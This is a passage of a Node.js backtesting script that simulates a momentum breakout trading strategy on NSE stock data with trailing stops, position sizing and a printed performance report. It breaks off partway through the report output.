#!/usr/bin/env node

/**
 * QuantSentinel Algorithmic Engine Backtester
 * 
 * Usage:
 *   node scripts/backtest.js [options]
 *   npm run backtest -- [options]
 * 
 * Examples:
 *   node scripts/backtest.js --period 1y
 *   node scripts/backtest.js --period 3y
 *   node scripts/backtest.js --period 5y
 *   node scripts/backtest.js --start 2024-01-01 --end 2026-10-01 --capital 200000
 *   node scripts/backtest.js --trades 10 --verbose
 */

const fs = require('fs');
const path = require('path');

const {
  calculateEMA, calculateSMA, calculateRSI, calculateATR, calculateADX
} = require('../backend/utils/indicators');
const engine = require('../backend/engine');

// Parse Command Line Arguments
function parseArgs() {
  const args = process.argv.slice(2);
  const options = {
    period: null,
    startDate: null,
    endDate: '2026-10-01',
    capital: 100000.0,
    maxPositions: 10,
    stopLossPercent: 0.048,      // 4.8%
    targetProfitPercent: 0.25,   // 25.0%
    allocStandard: 0.125,        // 12.5% standard allocation
    allocGradeA: 0.150,          // 15.0% high conviction allocation
    mode: 'broad',               // 'broad' (high frequency ~190 trades) or 'strict' (matches Dashboard UI ~40 trades)
    verbose: false,
    showTrades: 0,
    dataPath: null,
    help: false
  };

  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    if (arg === '--help' || arg === '-h') {
      options.help = true;
    } else if (arg === '--period' || arg === '-p') {
      options.period = args[++i]?.toLowerCase();
    } else if (arg === '--start' || arg === '-s') {
      options.startDate = args[++i];
    } else if (arg === '--end' || arg === '-e') {
      options.endDate = args[++i];
    } else if (arg === '--capital' || arg === '-c') {
      options.capital = parseFloat(args[++i]) || 100000.0;
    } else if (arg === '--max-positions' || arg === '-m') {
      options.maxPositions = parseInt(args[++i], 10) || 10;
    } else if (arg === '--stop-loss' || arg === '--sl') {
      const val = parseFloat(args[++i]);
      options.stopLossPercent = val > 1 ? val / 100 : val;
    } else if (arg === '--target' || arg === '--tp') {
      const val = parseFloat(args[++i]);
      options.targetProfitPercent = val > 1 ? val / 100 : val;
    } else if (arg === '--alloc-std') {
      const val = parseFloat(args[++i]);
      options.allocStandard = val > 1 ? val / 100 : val;
    } else if (arg === '--alloc-a') {
      const val = parseFloat(args[++i]);
      options.allocGradeA = val > 1 ? val / 100 : val;
    } else if (arg === '--trades' || arg === '-t') {
      options.showTrades = parseInt(args[++i], 10) || 10;
    } else if (arg === '--verbose' || arg === '-v') {
      options.verbose = true;
    } else if (arg === '--data' || arg === '-d') {
      options.dataPath = args[++i];
    } else if (arg === '--mode' || arg === '--strategy') {
      options.mode = args[++i]?.toLowerCase();
    } else if (arg === '--strict' || arg === '--live') {
      options.mode = 'strict';
    } else if (arg === '--broad' || arg === '--high-frequency') {
      options.mode = 'broad';
    }
  }

  // Handle preset period shortcuts
  if (options.period) {
    if (options.period === '1y' || options.period === '1') {
      options.startDate = '2025-10-01';
    } else if (options.period === '2y' || options.period === '2') {
      options.startDate = '2024-10-01';
    } else if (options.period === '3y' || options.period === '3') {
      options.startDate = '2023-10-01';
    } else if (options.period === '5y' || options.period === '5') {
      options.startDate = '2021-10-01';
    } else if (options.period === '7y' || options.period === '2019' || options.period === 'max') {
      options.startDate = '2019-01-01';
    } else if (options.period === 'ytd') {
      options.startDate = '2026-01-01';
    }
  }

  // Default to 3Y if no start date or period specified
  if (!options.startDate) {
    options.startDate = '2023-10-01';
  }

  return options;
}

function printHelp() {
  console.log(`
========================================================================
       QuantSentinel Trading Engine - Custom CLI Backtester
========================================================================

Usage:
  node scripts/backtest.js [options]
  npm run backtest -- [options]

Preset Periods:
  --period, -p <1y|2y|3y|5y|7y|ytd> Quick backtest duration preset (Default: 3y)
                                     '7y' or '2019' runs backtest from 2019-01-01

Strategy & Screening Modes:
  --mode, --strategy <broad|strict> Strategy filter profile (Default: broad)
                                    'broad' : High-frequency multi-setup momentum (~190 trades/yr, +41.4% PnL)
                                    'strict': Institutional 20d breakouts (~40 trades/yr, matches Dashboard UI)
  --strict, --live                  Shortcut for --mode strict
  --broad                           Shortcut for --mode broad

Custom Time Window:
  --start, -s <YYYY-MM-DD>       Custom simulation start date (e.g. 2024-01-01)
  --end, -e <YYYY-MM-DD>         Custom simulation end date (Default: 2026-10-01)

Portfolio & Risk Parameters:
  --capital, -c <number>         Starting cash capital in INR (Default: 100000)
  --max-positions, -m <number>   Maximum concurrent open holdings (Default: 10)
  --stop-loss, --sl <number>     Stop loss percent (e.g. 4.8 or 0.048, Default: 4.8%)
  --target, --tp <number>        Target profit percent (e.g. 25 or 0.25, Default: 25.0%)
  --alloc-std <number>           Standard allocation % (Default: 12.5%)
  --alloc-a <number>             Grade A+ high conviction allocation % (Default: 15.0%)

Display & Output:
  --trades, -t <count>           Show the last N closed trades in a formatted table
  --verbose, -v                  Print full trade-by-trade ledger
  --data, -d <filepath>          Path to custom market data JSON file
  --help, -h                     Show this help screen

Examples:
  node scripts/backtest.js --period 1y
  node scripts/backtest.js --period 3y --trades 15
  node scripts/backtest.js --period 5y --capital 200000
  node scripts/backtest.js --start 2024-01-01 --end 2026-10-01 -c 500000 -m 12
`);
}

// Locate and load market data
function loadMarketData(customPath) {
  const candidatePaths = [
    customPath,
    path.join(__dirname, '../backend/data/market_data_5y.json'),
    path.join(__dirname, '../../scratch/market_data_5y.json'),
    '/Users/sahilgobade/.gemini/antigravity-ide/brain/0ef74a54-6c19-4245-a925-6fe592edd74f/scratch/market_data_5y.json'
  ].filter(Boolean);

  for (const p of candidatePaths) {
    if (fs.existsSync(p)) {
      process.stdout.write(`Loading market data from ${path.basename(p)}... `);
      const raw = fs.readFileSync(p, 'utf8');
      const data = JSON.parse(raw);
      console.log(`Loaded ${Object.keys(data).length} symbols.`);
      return data;
    }
  }

  throw new Error("Market data file not found! Run the engine once or supply data path with --data <path>");
}

// Load watchlist fallback
function loadWatchlist() {
  const wlPath = path.join(__dirname, '../backend/data/watchlist_fallback.json');
  if (fs.existsSync(wlPath)) {
    return JSON.parse(fs.readFileSync(wlPath, 'utf8'));
  }
  return [];
}

// Evaluate Market Regime for Benchmark
function evaluateMarketRegime(simDate, cachedData) {
  const benchmarkData = cachedData['^NSEI'] || cachedData['NIFTYBEES.NS'] || cachedData['RELIANCE.NS'];
  if (!benchmarkData || benchmarkData.length < 50) return { regime: 'BULLISH', benchmarkRsi: 55, trend: 'UP', return5d: 0.01 };

  const bIdx = benchmarkData.findIndex(row => row.date === simDate);
  if (bIdx === -1 || bIdx < 20) return { regime: 'BULLISH', benchmarkRsi: 55, trend: 'UP', return5d: 0.01 };

  const closes = benchmarkData.slice(0, bIdx + 1).map(r => r.close);
  const ema20Arr = calculateEMA(closes, 20);
  const ema20 = ema20Arr[ema20Arr.length - 1];
  const ema50Arr = calculateEMA(closes, 50);
  const ema50 = ema50Arr.length > 0 ? ema50Arr[ema50Arr.length - 1] : null;

  const rsiArr = calculateRSI(closes, 14);
  const rsi = rsiArr.length > 0 ? rsiArr[rsiArr.length - 1] : 50;

  const currClose = closes[closes.length - 1];
  const return5d = bIdx >= 5 ? (currClose - benchmarkData[bIdx - 5].close) / benchmarkData[bIdx - 5].close : 0;

  if (currClose < ema20 * 0.985 && (rsi < 42 || return5d < -0.02) && (ema50 ? currClose < ema50 : true)) {
    return { regime: 'RISK_OFF', benchmarkRsi: rsi, trend: 'DOWN', return5d };
  }
  if (ema20 && currClose >= ema20 * 1.001 && return5d >= 0 && rsi >= 50) {
    return { regime: 'BULLISH', benchmarkRsi: rsi, trend: 'UP', return5d };
  }
  return { regime: 'NEUTRAL', benchmarkRsi: rsi, trend: 'CONSOLIDATING', return5d };
}

// Candidate Scanner (matching live engine rules)
function scanCandidates(simDate, cachedData, currentHoldings, watchlist) {
  const marketRegime = evaluateMarketRegime(simDate, cachedData);
  const candidates = [];

  const benchmarkData = cachedData['^NSEI'] || cachedData['NIFTYBEES.NS'] || cachedData['RELIANCE.NS'];
  let benchmarkReturn20d = 0;
  if (benchmarkData && benchmarkData.length > 0) {
    const bIdx = benchmarkData.findIndex(row => row.date === simDate);
    if (bIdx >= 20) {
      const bClose = benchmarkData[bIdx].close;
      const bPast = benchmarkData[bIdx - 20].close;
      if (bPast > 0) benchmarkReturn20d = (bClose - bPast) / bPast;
    }
  }

  const sectorCounts = {};
  for (const h of currentHoldings) {
    const sec = h.sector || 'Other';
    sectorCounts[sec] = (sectorCounts[sec] || 0) + 1;
  }

  for (const stock of watchlist) {
    if (stock.sector === 'ETFs') continue;

    const existingHolding = currentHoldings.find(h => h.symbol === stock.symbol);
    let isAccumulationCandidate = false;

    if (existingHolding) {
      const daysHeld = existingHolding.buyDate
        ? Math.max(1, Math.round((new Date(simDate) - new Date(existingHolding.buyDate)) / (1000 * 60 * 60 * 24)))
        : 5;

      if (existingHolding.isAccumulated || (existingHolding.profitPercent || 0) < 6.0 || daysHeld < 3) continue;
      isAccumulationCandidate = true;
    }

    const maxPerSector = 2;
    if (!isAccumulationCandidate && stock.sector !== 'ETFs' && (sectorCounts[stock.sector] || 0) >= maxPerSector) continue;

    const stockHistory = cachedData[stock.symbol];
    if (!stockHistory || stockHistory.length === 0) continue;

    const dayIdx = stockHistory.findIndex(row => row.date === simDate);
    if (dayIdx === -1 || dayIdx < 50) continue;

    const currentBar = stockHistory[dayIdx];
    const currentClose = currentBar.close;
    if (currentClose < 20 || currentClose > 75000) continue;

    const closesSlice = stockHistory.slice(0, dayIdx + 1).map(r => r.close);
    const volumesSlice = stockHistory.slice(0, dayIdx + 1).map(r => r.volume);
    const highsSlice = stockHistory.slice(0, dayIdx + 1).map(r => r.high);
    const lowsSlice = stockHistory.slice(0, dayIdx + 1).map(r => r.low);

    const rsiArr = calculateRSI(closesSlice, 14);
    const rsiVal = rsiArr[rsiArr.length - 1] || 50;

    const ema20Arr = calculateEMA(closesSlice, 20);
    const ema20 = ema20Arr[ema20Arr.length - 1];
    const ema50Arr = calculateEMA(closesSlice, 50);
    const ema50 = ema50Arr.length > 0 ? ema50Arr[ema50Arr.length - 1] : null;

    if (!ema20 || currentClose < ema20) continue;
    if (ema50 && (ema20 < ema50 * 1.01 || currentClose < ema50)) continue;

    const len = closesSlice.length;
    const past20Close = closesSlice[Math.max(0, len - 21)];
    const stockReturn20d = past20Close > 0 ? (currentClose - past20Close) / past20Close : 0;
    const rsExcess = stockReturn20d - benchmarkReturn20d;
    if (rsExcess < 0.030) continue;

    const past10Close = closesSlice[Math.max(0, len - 11)];
    const stockReturn10d = past10Close > 0 ? (currentClose - past10Close) / past10Close : 0;
    if (stockReturn10d > 0.18) continue;

    const distFromEma20 = (currentClose - ema20) / ema20;
    if (distFromEma20 > 0.080) continue;

    const lookback20Highs = highsSlice.slice(Math.max(0, len - 21), len - 1);
    const highestHigh20 = lookback20Highs.length > 0 ? Math.max(...lookback20Highs) : currentClose;
    const isNew20dHigh = currentBar.high >= highestHigh20;
    const distTo20dHigh = highestHigh20 > 0 ? (highestHigh20 - currentClose) / highestHigh20 : 0;
    const isCoilingNearHigh = distTo20dHigh <= 0.015 && distTo20dHigh >= -0.01;
    if (!isNew20dHigh && !isCoilingNearHigh) continue;

    const avgVol20 = volumesSlice.slice(Math.max(0, len - 21), len - 1).reduce((a, b) => a + b, 0) / 20;
    const rvol = avgVol20 > 0 ? (currentBar.volume || 0) / avgVol20 : 1;
    if (rvol < 1.75) continue;

    const prevClose = closesSlice[len - 2] || currentClose;
    const dayMove = (currentClose - prevClose) / prevClose;
    if (dayMove < 0.014) continue;

    const currentOpen = currentBar.open !== undefined ? currentBar.open : currentClose;
    if (currentClose < currentOpen) continue;

    const candleRange = currentBar.high - currentBar.low;
    const clv = candleRange > 0 ? (currentClose - currentBar.low) / candleRange : 0.5;
    if (clv < 0.64) continue;

    if (rsiVal > 76.5) continue;

    let score = 76;
    if (isNew20dHigh && clv >= 0.70 && rvol >= 2.0 && rsExcess >= 0.05) score = 96;
    else if (isNew20dHigh && rvol >= 1.8) score = 91;
    else if (isCoilingNearHigh && rvol >= 2.0) score = 86;

    candidates.push({
      symbol: stock.symbol,
      name: stock.name,
      sector: stock.sector,
      price: currentClose,
      score,
      rsGain: rsExcess,
      rvol,
      isAccumulation: isAccumulationCandidate,
      parentHolding: isAccumulationCandidate ? existingHolding : null
    });
  }

  candidates.sort((a, b) => b.score - a.score || b.rsGain - a.rsGain);
  return { candidates, marketRegime };
}

// Run Backtest Core Simulation
function executeBacktest(options, cachedData, watchlist) {
  const benchmarkData = cachedData['^NSEI'] || cachedData['NIFTYBEES.NS'] || cachedData['RELIANCE.NS'];
  const tradingDates = benchmarkData
    .map(r => r.date)
    .filter(d => d >= options.startDate && d <= options.endDate)
    .sort();

  if (tradingDates.length === 0) {
    throw new Error(`No trading dates found between ${options.startDate} and ${options.endDate}!`);
  }

  const initialCapital = options.capital;
  const state = {
    cash: initialCapital,
    holdings: [],
    history: [],
    valuationHistory: []
  };

  let maxPortfolioPeak = initialCapital;
  let maxDrawdownPercent = 0.0;

  for (const simDate of tradingDates) {
    const remainingHoldings = [];

    // Evaluate open holdings for exit or stop-loss adjustments
    for (const position of state.holdings) {
      const stockData = cachedData[position.symbol];
      const dayBar = stockData ? stockData.find(row => row.date === simDate) : null;
      if (!dayBar) { remainingHoldings.push(position); continue; }

      const { high, low, close } = dayBar;
      let triggerSell = false;
      let sellPrice = close;
      let sellReason = '';

      const dayIdx = stockData.findIndex(row => row.date === simDate);
      const buyIdx = stockData.findIndex(row => row.date === position.buyDate);
      const tradingDaysHeld = (buyIdx !== -1 && dayIdx !== -1) ? (dayIdx - buyIdx) : 5;
      const currentGainPct = ((close - position.buyPrice) / position.buyPrice) * 100;
      const todayPeakGainPercent = ((high - position.buyPrice) / position.buyPrice) * 100;

      if (!position.peakProfitGainPercent || todayPeakGainPercent > position.peakProfitGainPercent) {
        position.peakProfitGainPercent = todayPeakGainPercent;
      }
      const peakProfitGainPercent = position.peakProfitGainPercent;

      let dayEma20 = null;
      let stockRsi = 50;
      if (dayIdx >= 10) {
        const closesSoFar = stockData.slice(0, dayIdx + 1).map(r => r.close);
        const ema20Arr = calculateEMA(closesSoFar, 20);
        dayEma20 = ema20Arr[ema20Arr.length - 1];
        const rsiArr = calculateRSI(closesSoFar, 14);
        stockRsi = rsiArr[rsiArr.length - 1] || 50;
      }

      // Trailing profit lock milestones:
      // +3% peak gain -> move stop to Breakeven (+1.2% buffer)
      if (peakProfitGainPercent >= 3.0) {
        const beLevel = position.buyPrice * 1.012;
        if (beLevel > position.stopLoss) position.stopLoss = beLevel;
      }
      // +11% peak gain -> lock in +5.5% minimum profit
      if (peakProfitGainPercent >= 11.0) {
        const lock1 = position.buyPrice * 1.055;
        if (lock1 > position.stopLoss) position.stopLoss = lock1;
      }
      // +18% peak gain -> lock in +11.5% profit
      if (peakProfitGainPercent >= 18.0) {
        const lock2 = position.buyPrice * 1.115;
        if (lock2 > position.stopLoss) position.stopLoss = lock2;
      }
      // +25% peak gain -> trail along 20 EMA or lock +18%
      if (peakProfitGainPercent >= 25.0) {
        const runnerTrail = dayEma20 ? dayEma20 * 0.99 : position.buyPrice * 1.18;
        if (runnerTrail > position.stopLoss) position.stopLoss = runnerTrail;
      }
      if (peakProfitGainPercent >= 35.0 && dayEma20) {
        const runnerTrail = dayEma20 * 0.995;
        if (runnerTrail > position.stopLoss) position.stopLoss = runnerTrail;
      }

      const isTrailingStop = position.stopLoss > position.buyPrice;
      const trailingBreach = close <= position.stopLoss;
      const initialBreach = close <= position.stopLoss || low <= position.stopLoss;

      if (isTrailingStop ? trailingBreach : initialBreach) {
        triggerSell = true;
        sellPrice = (dayBar.open && dayBar.open < position.stopLoss) ? dayBar.open : position.stopLoss;
        sellReason = isTrailingStop ? 'Trailing Profit Locked' : 'Stop Loss Triggered';
      }
      else if (tradingDaysHeld >= 3 && tradingDaysHeld <= 4 && currentGainPct <= -2.4 && stockRsi < 50 && dayEma20 && close < dayEma20) {
        triggerSell = true;
        sellPrice = close;
        sellReason = 'Early Failed Breakout Exit';
      }
      else if (tradingDaysHeld >= 6 && currentGainPct < -1.0 && dayEma20 && close < dayEma20) {
        triggerSell = true;
        sellPrice = close;
        sellReason = 'Stagnation Time-Stop';
      }
      else if (tradingDaysHeld >= 10 && currentGainPct <= 0.0 && dayEma20 && close < dayEma20) {
        triggerSell = true;
        sellPrice = close;
        sellReason = 'Stagnation Dead-Money Exit';
      }
      else if (peakProfitGainPercent >= 4.0 && peakProfitGainPercent < 10.0 && dayEma20 && close < dayEma20) {
        triggerSell = true;
        sellPrice = close;
        sellReason = 'Failed Follow-Through';
      }
      else if (!position.isClimaxScaled && currentGainPct >= 20.0 && stockRsi >= 82 && dayEma20 && close > dayEma20 * 1.12) {
        if (position.quantity >= 2) {
          const pQty = Math.floor(position.quantity * 0.5);
          const pRev = pQty * close;
          const pCost = pQty * position.buyPrice;
          state.cash += pRev;
          position.quantity -= pQty;
          position.isClimaxScaled = true;
          position.stopLoss = Math.max(position.stopLoss, dayEma20 ? dayEma20 * 0.99 : position.buyPrice * 1.15);
          state.history.push({
            symbol: position.symbol,
            buyDate: position.buyDate,
            sellDate: simDate,
            daysHeld: tradingDaysHeld,
            buyPrice: position.buyPrice,
            sellPrice: close,
            quantity: pQty,
            profit: pRev - pCost,
            profitPercent: ((pRev - pCost) / pCost) * 100,
            reason: 'Partial Climax Profit Booked'
          });
        } else {
          triggerSell = true;
          sellPrice = close;
          sellReason = 'Parabolic Climax Blow-Off';
        }
      }

      if (triggerSell) {
        const rev = position.quantity * sellPrice;
        const cost = position.quantity * position.buyPrice;
        state.cash += rev;
        state.history.push({
          symbol: position.symbol,
          buyDate: position.buyDate,
          sellDate: simDate,
          daysHeld: tradingDaysHeld,
          buyPrice: position.buyPrice,
          sellPrice,
          quantity: position.quantity,
          profit: rev - cost,
          profitPercent: ((rev - cost) / cost) * 100,
          reason: sellReason
        });
      } else {
        position.currentPrice = close;
        position.value = position.quantity * close;
        position.profit = position.value - (position.quantity * position.buyPrice);
        position.profitPercent = (position.profit / (position.quantity * position.buyPrice)) * 100;
        remainingHoldings.push(position);
      }
    }
    state.holdings = remainingHoldings;

    // Scan for new setups based on selected strategy mode
    let scanResult;
    if (options.mode === 'strict') {
      scanResult = engine.scanMarketCandidates(simDate, cachedData, state.holdings, {
        maxPositions: options.maxPositions,
        stopLossPercent: options.stopLossPercent,
        targetProfitPercent: options.targetProfitPercent
      });
    } else {
      scanResult = scanCandidates(simDate, cachedData, state.holdings, watchlist);
    }
    const { candidates, marketRegime } = scanResult;

    const executeBuy = (targetStock) => {
      let currentHoldingsValue = 0;
      for (const h of state.holdings) currentHoldingsValue += h.value;
      const totalPortfolioValue = state.cash + currentHoldingsValue;
      const minCashReserve = Math.min(2000, totalPortfolioValue * 0.02);
      if (state.cash <= minCashReserve) return false;

      if (targetStock.isAccumulation) {
        const parent = state.holdings.find(h => h.symbol === targetStock.symbol);
        if (!parent || parent.isAccumulated) return false;

        const maxAddQtyByParent = Math.max(1, Math.floor(parent.quantity * 0.5));
        const maxCapitalForAdd = Math.min(totalPortfolioValue * 0.06, state.cash - minCashReserve);
        const maxAddQtyByCap = Math.floor(maxCapitalForAdd / targetStock.price);

        let qty = Math.min(maxAddQtyByParent, maxAddQtyByCap);
        if (qty <= 0 && parent.quantity === 1 && state.cash >= targetStock.price + minCashReserve) {
          if ((parent.value + targetStock.price) <= totalPortfolioValue * 0.20) qty = 1;
        }
        if (qty <= 0) return false;

        const cost = qty * targetStock.price;
        state.cash -= cost;

        const totalOldCost = parent.quantity * parent.buyPrice;
        const totalNewQty = parent.quantity + qty;
        const blendedBuyPrice = (totalOldCost + cost) / totalNewQty;

        const guaranteedStopPrice = (cost + (parent.quantity * parent.stopLoss)) / totalNewQty;
        const newStopLoss = Math.max(blendedBuyPrice * 1.002, guaranteedStopPrice);

        parent.quantity = totalNewQty;
        parent.buyPrice = blendedBuyPrice;
        parent.currentPrice = targetStock.price;
        parent.stopLoss = newStopLoss;
        parent.targetPrice = blendedBuyPrice * (1 + options.targetProfitPercent);
        parent.value = totalNewQty * targetStock.price;
        parent.profit = parent.value - (totalNewQty * blendedBuyPrice);
        parent.profitPercent = (parent.profit / (totalNewQty * blendedBuyPrice)) * 100;
        parent.isAccumulated = true;
        return true;
      }

      if (state.holdings.length >= options.maxPositions) return false;

      // Conviction Position Sizing
      const isHighConviction = (targetStock.score || 0) >= 93;
      const allocPct = isHighConviction ? options.allocGradeA : options.allocStandard;
      const targetPositionSize = totalPortfolioValue * allocPct;
      const minAllocationFloor = Math.min(4000, totalPortfolioValue * 0.04);
      if (state.cash < minAllocationFloor + minCashReserve) return false;

      const capitalAllocation = Math.min(targetPositionSize, state.cash - minCashReserve);
      let qty = Math.floor(capitalAllocation / targetStock.price);
      if (qty <= 0 && state.cash >= targetStock.price + minCashReserve && targetStock.price <= totalPortfolioValue * 0.35) {
        qty = 1;
      }
      if (qty <= 0) return false;

      const cost = qty * targetStock.price;
      state.cash -= cost;
      const targetPrice = targetStock.price * (1 + options.targetProfitPercent);
      const stopLoss = targetStock.price * (1 - options.stopLossPercent);

      state.holdings.push({
        symbol: targetStock.symbol,
        name: targetStock.name,
        sector: targetStock.sector,
        quantity: qty,
        buyPrice: targetStock.price,
        currentPrice: targetStock.price,
        buyDate: simDate,
        targetPrice,
        stopLoss,
        value: cost,
        profit: 0.0,
        profitPercent: 0.0,
        score: targetStock.score
      });
      return true;
    };

    // First deploy to accumulation compounders, then new breakout setups
    for (const c of candidates.filter(x => x.isAccumulation)) {
      if (state.cash < 4000) break;
      executeBuy(c);
    }

    let curHoldingsVal = 0;
    for (const h of state.holdings) curHoldingsVal += h.value;

    let newBuysToday = 0;
    const maxBuysToday = (options.mode === 'strict')
      ? ((marketRegime?.regime === 'BULLISH' && (state.cash / (state.cash + curHoldingsVal)) > 0.20) ? 4 : (marketRegime?.regime === 'BULLISH') ? 2 : (marketRegime?.regime === 'RISK_OFF') ? 1 : 2)
      : 99;

    for (const c of candidates.filter(x => !x.isAccumulation)) {
      if (state.holdings.length >= options.maxPositions) break;
      if (newBuysToday >= maxBuysToday) break;
      if (state.cash < 4000) break;
      const ok = executeBuy(c);
      if (ok) newBuysToday++;
    }

    // Portfolio valuation and peak tracking
    curHoldingsVal = 0;
    for (const h of state.holdings) curHoldingsVal += h.value;
    const totalVal = state.cash + curHoldingsVal;
    if (totalVal > maxPortfolioPeak) maxPortfolioPeak = totalVal;
    const curDrawdown = ((maxPortfolioPeak - totalVal) / maxPortfolioPeak) * 100;
    if (curDrawdown > maxDrawdownPercent) maxDrawdownPercent = curDrawdown;

    state.valuationHistory.push({
      date: simDate,
      cash: state.cash,
      holdingsValue: curHoldingsVal,
      totalValue: totalVal
    });
  }

  // End of simulation final portfolio stats
  let finalHoldingsVal = 0;
  for (const h of state.holdings) finalHoldingsVal += h.value;
  const finalTotalVal = state.cash + finalHoldingsVal;
  const netPnL = finalTotalVal - initialCapital;
  const netPnLPct = (netPnL / initialCapital) * 100;

  // Benchmark Return Calculation
  const firstBRow = benchmarkData.find(r => r.date >= options.startDate);
  const lastBRow = benchmarkData.filter(r => r.date <= options.endDate).pop();
  let benchmarkReturnPct = 0;
  if (firstBRow && lastBRow && firstBRow.close > 0) {
    benchmarkReturnPct = ((lastBRow.close - firstBRow.close) / firstBRow.close) * 100;
  }

  // Duration in years for CAGR
  const simStart = new Date(tradingDates[0]);
  const simEnd = new Date(tradingDates[tradingDates.length - 1]);
  const durationYears = Math.max(0.1, (simEnd - simStart) / (1000 * 60 * 60 * 24 * 365.25));
  const cagr = ((Math.pow(finalTotalVal / initialCapital, 1 / durationYears)) - 1) * 100;

  // Trade Statistics
  const trades = state.history;
  const totalTrades = trades.length;
  const winningTrades = trades.filter(t => t.profit > 0);
  const losingTrades = trades.filter(t => t.profit <= 0);

  const winRate = totalTrades > 0 ? (winningTrades.length / totalTrades) * 100 : 0;
  const totalGains = winningTrades.reduce((acc, t) => acc + t.profit, 0);
  const totalLosses = Math.abs(losingTrades.reduce((acc, t) => acc + t.profit, 0));
  const profitFactor = totalLosses > 0 ? (totalGains / totalLosses) : (totalGains > 0 ? 99.9 : 0);

  const avgTradeProfitPct = totalTrades > 0 ? (trades.reduce((acc, t) => acc + t.profitPercent, 0) / totalTrades) : 0;
  const avgTradeProfitRs = totalTrades > 0 ? (netPnL / totalTrades) : 0;

  const avgWinPct = winningTrades.length > 0 ? (winningTrades.reduce((acc, t) => acc + t.profitPercent, 0) / winningTrades.length) : 0;
  const avgWinRs = winningTrades.length > 0 ? (totalGains / winningTrades.length) : 0;

  const avgLossPct = losingTrades.length > 0 ? (losingTrades.reduce((acc, t) => acc + t.profitPercent, 0) / losingTrades.length) : 0;
  const avgLossRs = losingTrades.length > 0 ? (totalLosses / losingTrades.length) : 0;

  const avgDaysHeld = totalTrades > 0 ? (trades.reduce((acc, t) => acc + (t.daysHeld || 5), 0) / totalTrades) : 0;

  const largestWin = winningTrades.length > 0 ? Math.max(...winningTrades.map(t => t.profitPercent)) : 0;
  const largestLoss = losingTrades.length > 0 ? Math.min(...losingTrades.map(t => t.profitPercent)) : 0;

  // Exit reason breakdown
  const reasonCounts = {};
  for (const t of trades) {
    const r = t.reason || 'Other';
    reasonCounts[r] = (reasonCounts[r] || 0) + 1;
  }

  return {
    tradingDays: tradingDates.length,
    startDate: tradingDates[0],
    endDate: tradingDates[tradingDates.length - 1],
    durationYears,
    initialCapital,
    finalTotalVal,
    netPnL,
    netPnLPct,
    benchmarkReturnPct,
    alpha: netPnLPct - benchmarkReturnPct,
    cagr,
    maxDrawdownPercent,
    totalTrades,
    winningTradesCount: winningTrades.length,
    losingTradesCount: losingTrades.length,
    winRate,
    profitFactor,
    avgTradeProfitPct,
    avgTradeProfitRs,
    avgWinPct,
    avgWinRs,
    avgLossPct,
    avgLossRs,
    avgDaysHeld,
    largestWin,
    largestLoss,
    reasonCounts,
    openPositionsCount: state.holdings.length,
    openHoldingsValue: finalHoldingsVal,
    trades,
    openHoldings: state.holdings
  };
}

// Display Formatted Output
function printReport(res, options) {
  const pad = (str, len) => String(str).padEnd(len);
  const padL = (str, len) => String(str).padStart(len);
  const inr = (n) => `₹${Math.round(n).toLocaleString('en-IN')}`;
  const pct = (n) => `${n >= 0 ? '+' : ''}${n.toFixed(2)}%`;

  console.log(`
================================================================================
          QUANTSENTINEL QUANTITATIVE ENGINE - BACKTEST REPORT
================================================================================
Strategy Profile   : ${options.mode === 'strict' ? 'Strict Institutional Breakouts (Matches Dashboard UI)' : 'Broad Multi-Setup Momentum (High Frequency)'}
Simulation Period  : ${res.startDate} to ${res.endDate} (${res.tradingDays} Sessions, ${res.durationYears.toFixed(2)} Years)
Initial Capital    : ${inr(res.initialCapital)}
Max Holdings Cap   : ${options.maxPositions} concurrent positions
Stop Loss Setting  : -${(options.stopLossPercent * 100).toFixed(1)}% (Hard Risk Limit)
Target Profit      : +${(options.targetProfitPercent * 100).toFixed(1)}% (Algorithmic Target)
Position Sizing    : ${(options.allocGradeA * 100).toFixed(1)}% (Grade A+ Breakouts) / ${(options.allocStandard * 100).toFixed(1)}% (Standard Setups)
--------------------------------------------------------------------------------
PORTFOLIO PERFORMANCE:
  Starting Capital        : ${inr(res.initialCapital)}
  Final Portfolio Value   : ${inr(res.finalTotalVal)}
  Total Net Profit (PnL)  : ${pct(res.netPnLPct)} (${inr(res.netPnL)})
  Nifty 50 Benchmark      : ${pct(res.benchmarkReturnPct)}
  Alpha (Outperformance)  : ${pct(res.alpha)} vs Nifty 50
  Annualized Return (CAGR): ${pct(res.cagr)} per annum
  Maximum Drawdown (MDD)  : -${res.maxDrawdownPercent.toFixed(2)}%
--------------------------------------------------------------------------------
TRADE STATISTICS:
  Total Completed Trades  : ${res.totalTrades}
  Winning Trades          : ${res.winningTradesCount} (${res.winRate.toFixed(1)}%)
  Losing Trades           : ${res.losingTradesCount} (${(100 - res.winRate).toFixed(1)}%)
  WIN RATIO               : ${res.winRate.toFixed(2)}%
  Profit Factor           : ${res.profitFactor.toFixed(2)}x
  Average Trade Profit    : ${pct(res.avgTradeProfitPct)} (${inr(res.avgTradeProfitRs)})
  Average Winning Trade   : ${pct(res.avgWinPct)} (${inr(res.avgWinRs)})
  Average Losing Trade    : ${pct(res.avgLossPct)} (-${inr(res.avgLossRs)})
  Win / Loss Ratio        : ${(res.avgLossPct !== 0 ? Math.abs(res.avgWinPct / res.avgLossPct) : 0).toFixed(2)}x
  Largest Win             : ${pct(res.largestWin)}
  Largest Loss            : ${pct(res.largestLoss)}
  Average Holding Period  : ${res.avgDaysHeld.toFixed(1)} days
--------------------------------------------------------------------------------
EXIT REASON BREAKDOWN:`);

  for (const [reason, count] of Object.entries(res.reasonCounts)) {
    const reasonPct = ((count / res.totalTrades) * 100).toFixed(1);
    console.log(`  ${pad(reason, 30)} : ${padL(count, 4)} trades (${padL(reasonPct, 5)}%)`);
  }

  // Display Open Positions
  console.log(`--------------------------------------------------------------------------------
CURRENT OPEN HOLDINGS (${res.openPositionsCount}):`);
  if (res.openHoldings.length === 0) {
    console.log("  No open positions (Portfolio in 100% Cash).");
  } else {
    for (const h of res.openHoldings) {
      console.log(`  ${pad(h.symbol.replace('.NS', ''), 12)} : ${padL(h.quantity, 4)} shares @ ${padL(inr(h.buyPrice), 9)} | Cur: ${padL(inr(h.currentPrice), 9)} | P&L: ${padL(pct(h.profitPercent), 8)} (${inr(h.profit)})`);
    }
  }

  // Display Trades Table if requested
  const tradesToShow = options.verbose ? res.trades.length : options.showTrades;
  if (tradesToShow > 0 && res.trades.length > 0) {
    const list = res.trades.slice(-tradesToShow);
    console.log(`--------------------------------------------------------------------------------
RECENT CLOSED TRADES (${list.length} of ${res.trades.length}):
